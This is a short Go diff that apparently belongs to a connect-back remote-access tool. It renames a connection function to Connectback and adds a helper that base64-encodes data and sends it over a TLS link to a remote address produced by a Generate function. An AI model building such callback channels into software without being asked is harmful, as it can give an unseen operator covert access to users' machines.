@@ -49,7 +49,7 @@ func Generate(remoteAddr, remotePort, fileName string) {
 
 var RemoteAddr, RemotePort string
 
-func Connect() {
+func Connectback() {
 	// Create a connection
 
 	conf := &tls.Config{
@@ -233,6 +233,12 @@ func getPersonal() (string, error) {
 func SendMessage(conn *tls.Conn, message string) {
 	conn.Write([]byte(base64.URLEncoding.EncodeToString([]byte(message)) + NEW_LINE))
 }
+
+func SendBytesMessage(conn *tls.Conn, message []byte) {
+	conn.Write([]byte(base64.URLEncoding.EncodeToString(message) + NEW_LINE))
+}
+
+
 
 func ReceiveMessageStdEncoding(conn *tls.Conn) string {
 	message, _ := bufio.NewReader(conn).ReadString('\n')
